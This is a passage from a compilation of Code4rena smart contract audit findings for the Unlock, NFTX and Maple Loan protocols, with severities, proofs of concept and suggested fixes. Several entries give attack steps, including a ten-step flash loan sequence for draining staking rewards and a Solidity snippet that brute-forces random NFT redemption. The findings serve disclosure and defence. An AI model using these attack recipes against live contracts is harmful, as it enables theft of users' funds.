1.  Use SafeERC20 library to handle token transfers: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol>
2.  Consider checking the actual balances transferred (balance after-before) or clearly documenting that you do not support deflationary / rebasing / etc tokens.


**Please note: the following additional discussions and re-assessment took place approximately 2 months after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.**"
54.md,Key buyers will not be able to get refund if lock manager withdraws profits,medium,"Unlock contains a feature in which a key buyer can ask for a refund.
The refund is sent from the lock - where the purchase funds were sent.
The lock manager can withdraw all funds from the lock.
Therefore, if the lock manager withdraws enough profits from the lock, the user would not be able to cancel his key and request refund.
Even if a lock manager is not malicious, if he would want to enable users to cancel their key, he would have to keep track of how much tokens need to be kept in the contract in order to enable this - not a trivial calculation. A naive lock manager might accidentally disable refunds for his clients.

#### Impact

Refunds are not guaranteed.
A user might buy a key expecting to cancel it within some time, only to discover he can not cancel it. (This loss of user funds is why I consider this a high risk finding.)
An unaware lock manager who just wants to withdraw all his profits might accidentally discover that he removed his users' ability to cancel their key.

#### Notes

It seems the Unlock team is aware to some extent that withdrawing breaks refunds, as they state in the `withdraw` function:

       * TODO: consider allowing anybody to trigger this as long as it goes to owner anyway?
       *  -- however be wary of draining funds as it breaks the `cancelAndRefund` and `expireAndRefundFor`
       * use cases.

However, even if just the owner is allowed to call it, he may break the refund functionality - on purpose or accidentally.
Looking on Unlock documentation I don't see a warning to creators about withdrawing their funds.

#### Proof of Concept

`withdraw` function has no limit on the amount withdrawn, therefore the owner can withdraw all funds:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinLockCore.sol#L133:#L162>

`cancelAndRefund` transfers the funds from the same lock contract:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinRefunds.sol#L118>
Therefore if there are not enough funds, the transfer will fail.

#### Recommended Mitigation Steps

Perhaps a sort of MasterChef-like shares system can be implemented in order to make sure the owner leaves enough funds in the lock to process refunds."
54.md,Refund mechanism doesn't take into account that key price can change,medium,"Lock manager can change key pricing.
The refund mechanism calculates refund according to current key price, not price actually paid.

#### Impact

A user refunding can get less (or more) funds than deserved.

#### Proof of Concept

Refund only takes the current price into account:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinRefunds.sol#L144:#L152>

Lock manager can update key price at any point, and the old price is not saved anywhere:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinLockCore.sol#L183>

So if for example a key price has gone down, a user who tried to refund will get less funds than deserved.

#### Recommended Mitigation Steps

Consider saving the amount the user paid, and refund according to that.
Or having a kind of a price snapshot/version mechanism."
54.md,Key transfer will destroy key if from==to,medium,"If calling `transferFrom` with `_from == _recipient`, the key will get destroyed (meaning the key will be set as expired and set the owner's key to be 0).

#### Impact

A key manager or approved might accidentally destroy user's token.

Note: this requires user error and so I'm not sure if this is a valid finding.
However, few things make me think that it is valid:

*   Unlock protocol checks for transfer to 0-address, so some input validation is there
*   Since other entities other than the owner can be allowed to transfer owner's token, it might be best to make sure such accidental mistake could not happen.
*   This scenario manifests a unique and probably unintended behavior

#### Proof of Concept

By following `transferFrom`'s execution:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L109:#L166>
One can see that in the case where `_from == _recipient` with a valid key:

*   The function will deduct transfer fee from the key
*   The function will incorrectly add more time to the key's expiration ([L151](https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L151))
*   The function will expire and reset the key ([L155](https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L155:#L158))

Therefore, the user will lose his key without getting a refund.

#### Recommended Mitigation Steps

Add a require statement in the beginning of `transferFrom`:
`require(_from != _recipient, 'TRANSFER_TO_SELF');`"
54.md,MixinPurchase:shareKey allows to generate keys without purchasing,medium,"The `shareKey` function allows a user to share some time with another user that doesn't already has/had a key and this generates a new key. This even allows the user to generate more keys than `\_maxNumberOfKeys`.

Attacker generates a lot of EOA addresses, buys a key, share the minimum necessary time with each address and in each ""sharing"" a new key gets generated. This allows cheaply to allocate alot of ""keys"" with out really purchasing them and a lot of user can't get a ""key"" because purchase has a modifier notSoldOut, that limits the max purchasable to ""keys"" to `maxNumberOfKeys`

#### Proof of Concept

Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

*   rethink the whole `shareKey` thingy,"
54.md,Frontrunning `PublicLock.initialize()` can prevent upgrades due to insufficient access control,medium,"The unlock protocols base contract `Unlock.sol` uses `setLocktemplate()` to initialize the implementation contract for the `PublicLock` proxy. This function will initialize the relevant `PublicLock` contract which has been deployed separately. `PublicLock.initialize()` does not have any relevant access control and does not prevent arbitrary users from initialising. This means that a malicious user could front run the `setLocktemplate()` forcing the deployer of `PublicLock`'s implementation to redeploy. The process can be repeated, which costs the malicious user less than it would the owner of the Unlock Protocol, potentially unnecessarily draining funds from the development team.

#### Proof of Concept

[Lack of access control on initialize](https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/PublicLock.sol#L42-L51)

#### Recommended Mitigation Steps

Implement valid access control on the `PublicLock` contract to ensure only the relevant deployer can `initialize()`."
54.md,Referrer discount token amount can be manipulated,medium,"The `Unlock.recordKeyPurchase` function is called on each key purchase (`MixinPurchase.purchase`) and mints UDT tokens to the referrer.
The amount to mint is based on the transaction's gas price which is controlled by the caller (purchaser):

```solidity
uint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;
```

#### Impact

Tokens can be minted by purchasing a key with themself as the referrer at a high transaction gas price.
Depending on the UDT price on external markets, it could be profitable to buy a key at a high gas price, receive UDT and then sell them on a market for a profit.

#### Recommended Mitigation Steps

The amount minted should be more predictable and not depend on the user's gas price input.
Consider declaring an *average gas price* storage variable that is set by a trusted party and use this one instead."
54.md,Inaccurate fees computation,medium,"The `MixinTransfer.shareKey` function wants to compute a fee such that `time + fee * time == timeRemaining (timePlusFee)`:

```solidity
uint fee = getTransferFee(keyOwner, _timeShared);
uint timePlusFee = _timeShared + fee;
```

However, if the time remaining is less than the computed fee time, **the computation changes and a different formula is applied**.
The fee is now simply taken on the remaining time.

```solidity
if(timePlusFee < timeRemaining) {
  // now we can safely set the time
  time = _timeShared;
  // deduct time from parent key, including transfer fee
  _timeMachine(_tokenId, timePlusFee, false);
} else {
  // we have to recalculate the fee here
  fee = getTransferFee(keyOwner, timeRemaining);
  // @audit want it such that time + fee * time == timeRemaining, but fee is taken on timeRemaining instead of time
  time = timeRemaining - fee;
}
```

It should compute the `time` without fee as `time = timeRemaining / (1.0 + fee_as_decimal)` instead, i.e., `time = BASIS_POINTS_DEN * timeRemaining / (transferFeeBasisPoints + BASIS_POINTS_DEN)`.

#### Proof Of Concept

To demonstrate the difference with a 10% fee and a `_timeShared = 10,000s` which should be credited to the `to` account.

The correct time plus fee which is reduced from `from` (as in the `timePlusFee < timeRemaining` branch) would be `10,000 + 10% * 10,000 = 11,000`.

However, if `from` has not enough time remaining and `timePlusFee >= timeRemaining`, the entire time remaining is reduced from `from` but the credited `time` is computed wrongly as:
(Let's assume `timeRemaining == timePlusFee`): `time = 11,000 - 10% * 11,000 = 11,000 - 1,100 = 9900`.

They would receive 100 seconds less than what they are owed.

#### Impact

When transferring more time than the `from` account has, the credited time is scaled down wrongly and the receiver receives less time (a larger fee is applied).

#### Recommended Mitigation Steps

It should change the first `if` branch condition to `timePlusFee <= timeRemaining` (less than or equal).
In the `else` branch, it should compute the time without fee as `time = BASIS_POINTS_DEN * timeRemaining / (transferFeeBasisPoints + BASIS_POINTS_DEN)`."
54.md,Missing scaling factor in `recordKeyPurchase`?,medium,"The `Unlock.recordKeyPurchase` function computes the `maxTokens` as:

```solidity
maxTokens = IMintableERC20(udt).balanceOf(address(this)) * valueInETH / (2 + 2 * valueInETH / grossNetworkProduct) / grossNetworkProduct;
```

Note that `grossNetworkProduct` was already increased by `valueInETH` in the code before.
Meaning, the `(2 + 2 * valueInETH / grossNetworkProduct)` part of the computation will almost always be `2` as usually `grossNetworkProduct > 2 * valueInETH`, and thus the `2 * valueInETH / grossNetworkProduct` is zero by integer division.

#### Impact

The `maxTokens` curve might not be computed as intended and lead to being able to receive more token rewards than intended.

#### Recommended Mitigation Steps

The comment ""we distribute tokens using asymptotic curve between 0 and 0.5"" should be more clear to indicate how exactly the curve looks like.
It could be that a floating-point number was desired instead of the integer division in `2 * valueInETH / grossNetworkProduct`. In that case, consider adding a scaling factor to this term and divide by it at the end of the computation again."
54.md,Missing maxNumberOfKeys checks in shareKey and grantKey,medium,"More keys can be minted than maxNumberOfKeys since `shareKey` and `grantKey` do not check if the lock is sold out.

#### Impact

More keys can be minted than intended.

#### Proof of Concept

In both `shareKey` and `grantKey`, if minting a new token, a new token is simply minted (and `_totalSupply` increased) without checking it against `maxNumberOfKeys`.
This is unlike `purchase`, which has the `notSoldOut` modifier.

`grantKey`:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinGrantKeys.sol#L41:#L42>

`shareKey`:
<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L83:#L84>
Both functions call `_assignNewTokenId` which does not check maxNumberOfKeys.

<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinKeys.sol#L311:#L322>
So you can say that `_assignNewTokenId` is actually the root of the error, and this is why I am submitting this as 1 finding and not 2 (for grantKey/shareKey).

#### Recommended Mitigation Steps

Add a check to `_assignNewTokenId` that will revert if we need to record a new key and `maxNumberOfKeys` has been reached.

 > However, we should take that into account in the `shareKey` flow so I'll mark as confirmed for that flow."
54.md,Malicious user can get infinite free trial by repeatedly refund and repurchase right before the freeTrial ends,medium,"The current design/implementation allows users who are refunded before to get another `freeTrial`. This can be exploited by malicious users to get an infinite free trial.

#### Proof of Concept

Given:

*   `keyPrice` is 1 ETH;
*   `freeTrialLength` is 31 days.

A malicious user can:

1.  Call `purchase()`, pay 1 ETH and get 31 days of `freeTrial` on day 1;
2.  Call `cancelAndRefund()` on day 30 and get 1 ETH of refund; then call `purchase()` again, pay 1 ETH and get 31 days of `freeTrial` again.

Repeat the steps above and the user can get infinite `freeTrial`.

#### Impact

A malicious third party may provide a service named `freeUnlock`, which will call `cancelAndRefund()` and `purchase()` automatically right before the end of the `freeTrial`. This can cause fund loss to all the owners that provide a `freeTrial`.

#### Recommendation

Consider adding a `mapping(address => uint256) freeTrialEnds` and make sure each address can only get 1 `freeTrial`.


 > 
 > So I'm not sure how this should be treated as it does affect how the protocol is intended to operate. Is there any reason for users to not abuse this @julien51 ? Typically with newspapers, you have to provide credit card details, so an individual is really limited by the number of cards they hold."
54.md,MixinRefunds: frontrun updateKeyPricing() for free profit,medium,"A malicious user is able to withdraw all payments that were paid to a lock owner if the owner increases the keyPrice.

#### Proof of Concept

When `updateKeyPricing()` is called to increase the price of a key, it is possible to frontrun this call and buy many keys at the cheaper price then request for a refund at the higher price.

#### Recommendation

Keep track of the price at which keys are purchased so that when you issue a refund, you use the original keyPrice to refund instead of the updated keyPrice



 > The cancellation penalty is pretty easy to apply just to a single lock from the [lock manager's perspective](https://github.com/unlock-protocol/unlock/blob/b7c5a555efc3c2be619cbb942eb67d4008baa049/smart-contracts/contracts/mixins/MixinRefunds.sol#L70). Before changing the lock price, a lock manager can easily apply a penalty for the difference in price. IE if I change the price from 10 to 12, I apply a penalty for 2 and anyone who tries to abuse this will only get a refund of 12-2 = 10.
 >
 > On top of that we're actually storing the amount paid for the latest key as part of our next upgrade to support automatically recurring memberships, which should make things even more robust as anyone will only get re-imbursed based on what they paid..."
8.md,Missing overflow check in `flashLoan`,high,"`ERC20FlashMintUpgradeable.flashLoan` does not check for an overflow when adding the fees to the `flashloan` amount.
The functionality might have been copied from https://eips.ethereum.org/EIPS/eip-3156 but this one already has overflow checks as it uses solidity 0.8.0. This leads to an issue where the attacker does not need to pay back the `flashloan` as they will burn 0 tokens:

```solidity
_burn(address(receiver), amount + fee);
```
They end up with a huge profit. (Luckily, this is currently not exploitable as the fee is set to 0 so there's no possibility to overflow. However, if governance decides to change the flashloan fee, flashloans can be taken without having to repay them). Recommend using `SafeMath`."
8.md,`distribute` DoS on missing `receiveRewards` implementation,high,"`NFTXEligiblityManager._sendForReceiver` should check `returnData.length == 1` before decoding. Otherwise, if it returns no return data, the `abi.decode` call will revert and with it the whole `distribute` function .

A single poorly implemented `feeReceiver` can break the whole `distribute` function and allow a denial of service by reverting the transaction.

Recommend changing to: `bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));`."
8.md,`getRandomTokenIdFromFund` yields wrong probabilities for ERC1155,high,"`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account.

Assume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.
Then `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.

This might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.

Recommend taking the quantities of each token into account (`quantity1155`) which probably requires a design change as it is currently hard to do without iterating over all tokens."
8.md,`NFTXLPStaking` Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault,high,"The LPStaking contract does not require that a stake be locked for any period of time. The LPStaking contract also does not track how long your stake has been locked. So an attacker Alice can stake, claim rewards, and unstake, all in one transaction. If Alice utilizes a flash loan, then she can claim nearly all of the rewards for herself, leaving very little left for the legitimate stakers.

The fact that the `NFTXVaultUpgradeable` contract contains a native `flashLoan` function makes this attack that much easier, although it would still be possible even without that due to flashloans on Uniswap, or wherever else the nftX token is found.

Since a flash loan will easily dwarf all of the legitimate stakers' size of stake, the contract will erroneously award nearly all of the rewards to Alice.

1.  Wait until an NFTX vault has accrued any significant amount of fees/rewards
2.  `FlashLoanBorrow` a lot of ETH using any generic flash loan provider
3.  `FlashLoanBorrow` a lot of nftx-vault-token using `NFTXVaultUpgradeable.flashLoan()`
4.  Deposit the ETH and nftx-vault-token's into Uniswap for Uniswap LP tokens by calling `Uniswap.addLiquidity()`
5.  Stake the Uniswap LP tokens in `NFTXLPStaking` by calling `NFTXLPStaking.deposit()`
6.  Claim nearly all of the rewards that have accrued for this vault due to how large the flashLoaned deposit is relative to all of the legitimate stakes by calling `NFTXLPStaking.claimRewards()`
7.  Remove LP tokens from `NFTXLPStaking` by calling `NFTXLPStaking.exit()`;
8.  Withdraw ETH and nftx-vault-token's by calling `Uniswap.removeLiquidity()`;
9.  Pay back nftx-vault-token flash loan
10. Pay back ETH flash loan

See [GitHub issue page](https://github.com/code-423n4/2021-05-nftx-findings/issues/88) for an in-depth  example.

Recommend requiring that staked LP tokens be staked for a particular period of time before they can be removed. Although a very short time frame (a few blocks) would avoid flash loan attacks, this attack could still be performed over the course of a few blocks less efficiently. Ideally, you would want the rewards to reflect the product of the amount staked and the duration that they've been staked, as well as having a minimum time staked.

Alternatively, if you really want to allow people to have the ability to remove their stake immediately, then only allow rewards to be claimed for stakes that have been staked for a certain period of time. Users would still be able to remove their LP tokens, but they could no longer siphon off rewards immediately."
8.md,Randomization of NFTs returned in redeem/swap operations can be brute-forced,medium,"If we assume that certain NFTs in a vault over time will have different market demand/price, then the users will try to redeem those specific NFTs. Even if direct redeems are disabled to prevent such a scenario to default to returning randomized NFTs, a user can brute-forced this on-chain randomization (using nonce + blockhash) by repeatedly trying to redeem/swap from a contract, checking the NFT IDs returned from the function and reverting the transaction if those are not the NFT IDs of specific interest.

The impact will be a subversion of the randomization goal to return random NFTs which cannot be specified by the user.

A [similar exploit happened recently with Meebit NFTs](https://twitter.com/sillytuna/status/1391013965170454540).

Recommend considering only EOA (external only account) for redeem/swap operations to prevent brute-forcing via contracts. Alternatively, make the user commit to pseudo-random IDs before revealing them.

**- [0xKiwi acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/78) **"
8.md,Use `safeTransfer`/`safeTransferFrom` consistently instead of `transfer`/`transferFrom`,medium,"It is good to add a `require()` statement that checks the return value of token transfers, or to use something like OpenZeppelin’s `safeTransfer`/`safeTransferFrom` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.

While most places use a `require` or `safeTransfer`/`safeTransferFrom`, there are three missing cases in the withdrawal of staking token and rescue of arbitrary tokens sent to the `FeeDistributor` contract.

Reference this similar medium-severity finding from [Consensys Diligence Audit of Fei Protocol](https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call).

Recommend using `safeTransfer`/`safeTransferFrom` or `require()` consistently.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/79)**"
8.md,Fee Distribution Re-Entrancy,medium,"The `distribute` function of `NFTXFeeDistributor` has no access control and will invoke a fallback on the fee receivers, meaning that a fee receiver can re-enter via this function to acquire their allocation repeatedly potentially draining the full balance and sending zero amounts to the rest of the recipients.

A smart contract with a malicious `receiveRewards` function can re-enter the `distribute` function with the same vault ID, thereby causing the exploit.

Recommend that re-entrancy protection should be incorporated into the `distribute` function. I should note that a seemingly innocuous contract can cause this re-entrancy by simply asking the owners of the project to include an upgrade-able contract that is then replaced for a malicious implementation.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/11)**"
8.md,Unbounded iteration in `NFTXEligiblityManager.distribute` over `_feeReceivers`,medium,"`NFTXEligiblityManager.distribute` iterates over all `_feeReceivers`. If the number of `_feeReceivers` gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call `distribute` at all.

Recommend keeping the number of `_feeReceivers` small.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/47)**"
8.md,Manager can grief with fees,medium,"The fees in `NFTXVaultUpgradeable` can be set arbitrarily high (no restriction in `setFees`).

The manager can front-run mints and set a huge fee (for example `fee = base`) which transfers user's NFTs to the vault but doesn't mint any pool share tokens in return for the user.

Similar griefing attacks are also possible with other functions besides `mint`.

Recommend checking for a max fee as a percentage of `base` (like 10%) whenever setting fees."
8.md,Tokens can get stuck in `NFTXMintRequestEligibility`,medium,"When dealing with ERC721 (instead of 1155) the amounts array is ignored, which leads to an issue.

User can call `NFTXMintRequestEligibility.requestMint` for an ERC721 with `amounts[i] = 0`.
The `ERC721.transferFrom` is still executed but user cannot `reclaimRequestedMint` later and the NFT is stuck as it checks (`amounts[i] > 0`).


Tokens can get stuck.
Also, subscribers to `Request` event could be tricked by specifying `amounts[i] > 1` in the ERC721 case, as only one token was transferred, but the amount multiple quantities get logged.

Recommend that `requestMint`: Check `amounts[i] == 1` in ERC721 case, `amounts[i] > 0` in 1155 case.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/59)**"
8.md,A malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract.,medium,"A malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract. This causes the fee distributor to double spend the `amountToSend` because the contract incorrectly assumes the returned data is truthful.

`NFTXFeeDistributor.sol`:
```solidity
Line 163: (bool success, bytes memory returnData) = address(_receiver.receiver).call(payload);
```
Recommend that you don't trust return data from externally called contracts. Only utilize whether the transaction succeeds to determine if the treasury fallback should be called.
```
Line 165: if (!success) {
```"
8.md,The direct redeem fee can be circumvented,medium,"Since the random NFT is determined in the same transaction a payment or swap is being executed, a malicious actor can revert a transaction if they did not get the NFT they wanted. Combined with utilizing Flashbots miners which do not publish transactions which revert with `FlashbotsCheckAndSend`, there would be no cost to constantly attempting this every block or after the nonce is updated from `getPseudoRand()`.

`NFTXVaultUpgradeable.sol`
```solidity
Line 374: uint256 tokenId = i < specificIds.length
    ? specificIds[i]
    : getRandomTokenIdFromFund();
```

In this way, the `directReedemFee` can be avoided and users may lose out on potential earnings. The code below shows a transfer ownership of ERC20 tokens to attack the contract.
```
function revertIfNotSpecifiedID(uint256 targetTokenID) public {
    NFTXVaultUpgradeable vault = NFTXVaultUpgradeable(_vault);
    uint256[] resultID = vault.redeem(1,[]);
    require(resultID[0] == targetTokenID);
}
```

Recommend using a commit-reveal pattern for NFT swaps and redemptions."
8.md,Front-running `setFees()` could avoid fees,low,"`setVaultFeatures()` and `setFees()` are two separate privileged functions. Users could front-run `setFees()` immediately after vault is enabled in `setVaultFeatures()` to mint (and possibly redeem/directRedeem/swap) many tokens. The fees for mint/redeem/directRedeem/swap are not initialized so are 0 by default. This leads to loss of fee revenue.

Recommend Setting defaults at initialization or combine this with `setVaultFeatures()` for atomically enabling functions and setting their fees in the same transaction.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/72)**"
8.md,Missing pool existence check in `balanceOf`,low,"In `NFTXLPStaking.sol`, `deposit()`, `exit()`, `withdraw()`,` claimRewards()` and other related functions that take a `vaultID` as parameter perform a pool existence check on the staking pool associated with that `vaultID`. However, `balanceOf` is missing a similar pool check.

This may result in returning an invalid balance of a non-existing or stale pool.

Recommend adding check ```require(pool.stakingToken != address(0), ""LPStaking: Nonexistent pool”);``` before L170.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/80)**"
8.md,Missing parameter validation,low,"Missing parameter validation for functions:
- `NFTXEligiblityManager.addModule, updateModule`
- `NFTXFeeDistributor` all `setter` functions (`setTreasuryAddress`, ...)
- `NFTXVaultUpgradeable.setManager`

Some wallets still default to zero addresses for a missing input which can lead to breaking critical functionality like setting the manager to the zero address and being locked out.

Recommend validating the parameters.

**- [0xKiwi (NFTX) confirmed ](https://github.com/code-423n4/2021-05-nftx-findings/issues/44)**"
8.md,Missing usage of SafeMath,low,"The following code does not use `SafeMath` and can potentially lead to overflows:
- `NFTXFeeDistributor.distribute`
- `NFTXFeeDistributor._sendForReceiver`

While looping through all `_feeReceivers` it could be that a broken vault was whitelisted that allows an attacker to perform an external call and break the invariant that always 1000 tokens are left in the contract.

Add `SafeMath` to `_sendForReceiver` even though one would expect the math to be safe."
8.md,Inconsistent solidity pragma,low,"The source files have different solidity compiler ranges referenced.  This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file.  It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.

This defect has numerous surfaces at https://github.com/code-423n4/2021-05-nftx/tree/main/nftx-protocol-v2/contracts/solidity

Recommend fixing a definite compiler range that is consistent between contracts and upgrade any affected contracts to conform to the specified compiler."
8.md,Unchecked external calls in `NFTXLPStaking`,low,"The `emergencyExit`/`emergencyExitAndClaim` functions take the staking and reward tokens as parameters and trust them for the withdrawal.

This does not lead to a critical issue (like being able to withdraw all funds) as one cannot deploy a fake reward smart contract to a `_rewardDistributionTokenAddr` and a random address without a smart contract will fail because of the `dist.balanceOf(msg.sender)` call not returning any data. However, checking if the distribution token exists is still recommended.

Recommend requiring `isContract(dist)`.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/48)**"
8.md,Vault's flash loan not implemented according to EIP-3156,low,"The `NFTXVaultUpgradeable.flashLoan` is not correctly implemented according to  EIP-3156 (but it tries to implement it as it inherits from `IERC3156FlashLenderUpgradeable`).

> ""If successful, flashLoan MUST return true."" - https://eips.ethereum.org/EIPS/eip-3156

It misses the return and currently always returns `false`.

Always returning `false` indicates that the flash loan was unsuccessful, when in reality it could have been successful.
This breaks any contract trying to integrate with it.

Recommend adding the return statement: `return super.flashLoan(...)`

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/54)**

**- [cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/54#issuecomment-848263863):**
 > Keeping this as low-risk as flash loan returning the project does not pose a security threat for the NFTX project itself"
8.md,`eligibilityManager` is always 0x0,low,"the contract `NFTXVaultFactoryUpgradeable`, variable `eligibilityManager` is never set thus it gets a default value of 0x0. So function `deployEligibilityStorage` should always fail as the eligibility manager does not exist on address 0x0.

Recommend either adding a setter for `eligibilityManager` or refactor function `deployEligibilityStorage` to work in such case."
8.md,lack of zero address validation,low,"Init function like `__FeeDistributor__init__()` is used to initialize the state variables. Since these state variables are used in many functions, it is possible that due to lack of input validation, an error in these state variables can lead to redeployment of contract.

* `In NFTXFeeDistributor.sol --> __FeeDistributor__init__()`
* `in NFTXLPStaking.sol --> __NFTXLPStaking__init()`
* `in NFTXVaultUpgradeable.sol -- > __NFTXVault_init()`
* `in StakingTokenProvider.sol --> __StakingTokenProvider_init()`

Recommend adding zero address validation.

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/82)**"
8.md,`__Ownable_init` will be called twice in multiple Eligibility contracts,low,"Here you have more info: https://gist.github.com/alexon1234/43bf4a72a5b06651f04fc8052349ac5a

**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/84)**"
55.md,"`makePayment()` Lack of access control allows malicious `lender` to retrieve a large portion of the funds earlier, making the borrower suffer fund loss",high,"[`MapleLoan.sol` L86-L93](https://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoan.sol#L86-L93)

```solidity
function makePayment(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {
    // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.
    require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), ""ML:MP:TRANSFER_FROM_FAILED"");

    ( principal_, interest_ ) = _makePayment();

    emit PaymentMade(principal_, interest_);
}
```

The current implementation allows anyone to call `makePayment()` and repay the loan with `_drawableFunds`.

This makes it possible for a malicious `lender` to call `makePayment()` multiple times right after `fundLoan()` and retrieve most of the funds back immediately, while then `borrower` must continue to make payments or lose the `collateral`.

##### PoC

Given:

*   `_collateralRequired` = 1 BTC
*   `_principalRequested` = 12,000 USDC
*   `_paymentInterval` = 30 day
*   `_paymentsRemaining` = 12
*   `_gracePeriod` = 1 day
*   `interestRate_` = 2e17

1.  The borrower calls `postCollateral()` and added `1 BTC` as `_collateralAsset`;
2.  The lender calls `fundLoan()` and added `12,000 USDC` as  `_fundsAsset`;
3.  The lender calls `makePayment()` 11 times, then:

*   `_drawableFunds` = 96
*   `_claimableFunds` = 11903
*   `_principal` = 1553

4.  The lender calls `_claimFunds()` get 11,903 USDC of `_fundsAsset` back;

Now, for the borrower `1,579 USDC` is due, but only `96 USDC` can be used. The borrower is now forced to pay the interests for the funds that never be used or lose the collateral.

##### Recommendation

Change to:

```solidity
function makePayment(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {
    // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.
    require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), ""ML:MP:TRANSFER_FROM_FAILED"");

    require(msg.sender == _borrower, ""ML:DF:NOT_BORROWER"");

    ( principal_, interest_ ) = _makePayment();

    emit PaymentMade(principal_, interest_);
}
```"
55.md,Anyone can call `closeLoan()` to close the loan,medium,"[`MapleLoan.sol` L56-L63](https://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoan.sol#L56-L63)

```solidity
function closeLoan(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {
    // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.
    require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), ""ML:CL:TRANSFER_FROM_FAILED"");

    ( principal_, interest_ ) = _closeLoan();

    emit LoanClosed(principal_, interest_);
}
```

Based on the context, we believe that the `closeLoan()` should only be called by the `borrower`. However, the current implementation allows anyone to call `closeLoan()` anytime after `fundLoan()`.

If there is no `earlyFee`, this enables a griefing attack, causing the `borrower` and `lender` to abandon this contract and redo everything which costs more gas.

If a platform fee exits, the lender will also suffer fund loss from the platform fee charged in `fundLoan()`.

##### Recommendation

Change to:

```solidity
function closeLoan(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {
    // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.
    require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), ""ML:CL:TRANSFER_FROM_FAILED"");

    require(msg.sender == _borrower, ""ML:DF:NOT_BORROWER"");

    ( principal_, interest_ ) = _closeLoan();

    emit LoanClosed(principal_, interest_);
}
```"
55.md,Unsafe implementation of `fundLoan()` allows attacker to steal collateral from an unfunded loan,medium,"[`MapleLoanInternals.sol` L257-L273](https://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoanInternals.sol#L257-L273)

```solidity
uint256 treasuryFee = (fundsLent_ * ILenderLike(lender_).treasuryFee() * _paymentInterval * _paymentsRemaining) / uint256(365 days * 10_000);

// Transfer delegate fee, if any, to the pool delegate, and decrement drawable funds.
uint256 delegateFee = (fundsLent_ * ILenderLike(lender_).investorFee() * _paymentInterval * _paymentsRemaining) / uint256(365 days * 10_000);

// Drawable funds is the amount funded, minus any fees.
_drawableFunds = fundsLent_ - treasuryFee - delegateFee;

require(
    treasuryFee == uint256(0) || ERC20Helper.transfer(_fundsAsset, ILenderLike(lender_).mapleTreasury(), treasuryFee),
